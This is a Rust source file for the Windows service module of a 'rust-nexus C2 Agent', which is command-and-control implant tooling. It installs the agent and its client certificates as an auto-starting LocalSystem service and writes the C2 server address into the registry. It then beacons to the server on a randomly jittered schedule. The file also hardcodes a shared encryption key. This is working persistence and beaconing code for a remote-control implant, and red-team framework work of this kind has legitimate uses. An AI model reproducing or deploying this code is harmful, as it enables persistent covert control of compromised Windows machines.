//! Windows service self-install / uninstall / dispatcher.
//!
//! Compiled only for `target_os = "windows"`. Invoked via CLI flags:
//!   nexus-agent.exe --install       register + start as Windows service (needs admin)
//!   nexus-agent.exe --uninstall     stop + remove the service (needs admin)
//!   nexus-agent.exe --run-service   internal; called by SCM at service start

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use windows_service::service::{
    ServiceAccess, ServiceControl, ServiceControlAccept, ServiceErrorControl, ServiceExitCode,
    ServiceInfo, ServiceStartType, ServiceState, ServiceStatus, ServiceType,
};
use windows_service::service_control_handler::{self, ServiceControlHandlerResult};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};
use windows_service::{define_windows_service, service_dispatcher};

const INSTALL_ROOT: &str = r"C:\ProgramData\nexus-agent";
const SERVICE_NAME: &str = "nexus-agent";
const SERVICE_DISPLAY: &str = "rust-nexus C2 Agent";

// ── public entry points ────────────────────────────────────────────────────

/// Copy bundle files → install root, register service, write env vars, start.
pub fn install() -> anyhow::Result<()> {
    let root = PathBuf::from(INSTALL_ROOT);
    std::fs::create_dir_all(&root)?;
    println!("[install] install root: {}", root.display());

    // Copy the four bundle files from our own directory into the install root.
    let exe_path = std::env::current_exe()?;
    let bundle_dir = exe_path
        .parent()
        .ok_or_else(|| anyhow::anyhow!("cannot determine binary directory"))?;

    for name in &[
        "nexus-agent.exe",
        "ca.crt.pem",
        "client.crt.pem",
        "client.key.pem",
    ] {
        let src = bundle_dir.join(name);
        if src.exists() {
            let dst = root.join(name);
            std::fs::copy(&src, &dst)?;
            println!("[install]   copied {}", name);
        }
    }

    // Lock down the private key: SYSTEM + Administrators read-only.
    let key_file = root.join("client.key.pem");
    if key_file.exists() {
        let _ = std::process::Command::new("icacls")
            .arg(&key_file)
            .arg("/inheritance:r")
            .status();
        let _ = std::process::Command::new("icacls")
            .arg(&key_file)
            .args(["/grant:r", "SYSTEM:(R)", "Administrators:(R)"])
            .status();
        println!("[install]   locked client.key.pem (SYSTEM+Admins only)");
    }

    // Register the Windows service.
    let manager = ServiceManager::local_computer(
        None::<&str>,
        ServiceManagerAccess::CONNECT | ServiceManagerAccess::CREATE_SERVICE,
    )?;
    let svc_exe = root.join("nexus-agent.exe");
    let svc_info = ServiceInfo {
        name: OsString::from(SERVICE_NAME),
        display_name: OsString::from(SERVICE_DISPLAY),
        service_type: ServiceType::OWN_PROCESS,
        start_type: ServiceStartType::AutoStart,
        error_control: ServiceErrorControl::Normal,
        executable_path: svc_exe,
        launch_arguments: vec![OsString::from("--run-service")],
        dependencies: vec![],
        account_name: None,    // LocalSystem
        account_password: None,
    };
    let service = manager.create_service(
        &svc_info,
        ServiceAccess::START | ServiceAccess::QUERY_STATUS,
    )?;
    println!("[install] service registered: {}", SERVICE_NAME);

    // Write per-service environment vars to the registry so SCM injects them
    // before spawning the service process.
    let server_addr = std::env::var("NEXUS_SERVER_ADDR")
        .unwrap_or_else(|_| std::env::var("NEXUS_C2_ADDR")
            .unwrap_or_else(|_| "https://127.0.0.1:50052".to_string()));
    set_service_env(&root, &server_addr)?;
    println!("[install] environment vars written to registry");

    // Start the service immediately.
    service.start(&[] as &[&std::ffi::OsStr])?;
    println!("[install] service started");
    println!("[install]");
    println!("[install] verify:  sc query {}", SERVICE_NAME);
    println!("[install] logs:    {}\\agent.log", root.display());
    println!("[install] remove:  nexus-agent.exe --uninstall");

    Ok(())
}

/// Stop the service (if running) and delete the service entry.
pub fn uninstall() -> anyhow::Result<()> {
    let manager =
        ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)?;
    let service = manager.open_service(
        SERVICE_NAME,
        ServiceAccess::STOP | ServiceAccess::DELETE | ServiceAccess::QUERY_STATUS,
    )?;
    // Best-effort stop; ignore errors (service may already be stopped).
    let _ = service.stop();
    std::thread::sleep(Duration::from_secs(2));
    service.delete()?;
    println!("[uninstall] service {} removed", SERVICE_NAME);
    Ok(())
}

/// Called by SCM. Connects this process to the service dispatcher; blocks
/// until the service stops.
pub fn run() -> anyhow::Result<()> {
    service_dispatcher::start(SERVICE_NAME, ffi_service_main)
        .map_err(|e| anyhow::anyhow!("service_dispatcher::start: {:?}", e))
}

// ── service dispatcher glue ────────────────────────────────────────────────

define_windows_service!(ffi_service_main, nexus_service_main);

fn nexus_service_main(_args: Vec<OsString>) {
    if let Err(e) = run_service_inner() {
        // stderr is not visible when running as a service; log to file instead.
        let _ = std::fs::write(
            format!("{}\\agent_panic.log", INSTALL_ROOT),
            format!("fatal: {}\n", e),
        );
    }
}

fn run_service_inner() -> anyhow::Result<()> {
    // Set up file-based tracing so logs are visible without a terminal.
    let log_path = format!("{}\\agent.log", INSTALL_ROOT);
    if let Ok(log_file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
    {
        let _ = tracing_subscriber::fmt()
            .with_writer(std::sync::Mutex::new(log_file))
            .with_env_filter(
                std::env::var("RUST_LOG")
                    .unwrap_or_else(|_| "info".to_string())
                    .as_str(),
            )
            .try_init();
    }

    // Shared stop flag set by the SCM Stop/Shutdown control handler.
    let stop = Arc::new(AtomicBool::new(false));
    let stop_signal = stop.clone();

    let status_handle =
        service_control_handler::register(SERVICE_NAME, move |ctrl| match ctrl {
            ServiceControl::Stop | ServiceControl::Shutdown => {
                stop_signal.store(true, Ordering::Relaxed);
                ServiceControlHandlerResult::NoError
            }
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            _ => ServiceControlHandlerResult::NotImplemented,
        })?;

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Running,
        controls_accepted: ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })?;

    // Build a fresh Tokio runtime and run the agent loop inside it.
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()?
        .block_on(service_agent_loop(stop));

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Stopped,
        controls_accepted: ServiceControlAccept::empty(),
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })?;

    Ok(())
}

async fn service_agent_loop(stop: Arc<AtomicBool>) {
    let server_addr = std::env::var("NEXUS_SERVER_ADDR")
        .unwrap_or_else(|_| "127.0.0.1:50052".to_string());

    // Same hardcoded key as the foreground path; replace with config loading
    // when a proper config file is wired up.
    let encryption_key: [u8; 32] = [
        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54,
        0x32, 0x10, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98,
        0x76, 0x54, 0x32, 0x10,
    ];

    let mut agent = match super::agent::NexusAgent::new(server_addr, encryption_key).await {
        Ok(a) => a,
        Err(e) => {
            tracing::error!("agent init failed: {}", e);
            return;
        }
    };

    loop {
        if stop.load(Ordering::Relaxed) {
            break;
        }
        match agent.run_cycle().await {
            Ok(_) => {
                let delay = rand::random::<u64>() % 60 + 30;
                tokio::time::sleep(Duration::from_secs(delay)).await;
            }
            Err(e) => {
                tracing::warn!("run_cycle error: {}", e);
                let delay = rand::random::<u64>() % 300 + 60;
                tokio::time::sleep(Duration::from_secs(delay)).await;
            }
        }
        if stop.load(Ordering::Relaxed) {
            break;
        }
    }
    tracing::info!("service agent loop exiting cleanly");
}

// ── registry helper ────────────────────────────────────────────────────────

/// Write per-service environment variables as REG_MULTI_SZ so the SCM
/// injects them before spawning the service process. Uses reg.exe (always
/// present at C:\Windows\System32\reg.exe) to avoid unsafe registry API
/// calls.
fn set_service_env(install_root: &Path, server_addr: &str) -> anyhow::Result<()> {
    // reg.exe REG_MULTI_SZ uses \0 as the sub-string separator in the /d value.
    let entries = [
        format!("NEXUS_CA_CERT={}\\ca.crt.pem", install_root.display()),
        format!(
            "NEXUS_CLIENT_CERT={}\\client.crt.pem",
            install_root.display()
        ),
        format!(
            "NEXUS_CLIENT_KEY={}\\client.key.pem",
            install_root.display()
        ),
        format!("NEXUS_SERVER_ADDR={}", server_addr),
        "RUST_LOG=info".to_string(),
    ];
    let multi_sz = entries.join("\\0");

    let status = std::process::Command::new("reg")
        .args([
            "add",
            &format!(
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{}",
                SERVICE_NAME
            ),
            "/v",
            "Environment",
            "/t",
            "REG_MULTI_SZ",
            "/d",
            &multi_sz,
            "/f",
        ])
        .status()?;

    if !status.success() {
        return Err(anyhow::anyhow!(
            "reg.exe failed writing service environment (exit {})",
            status
        ));
    }
    Ok(())
}
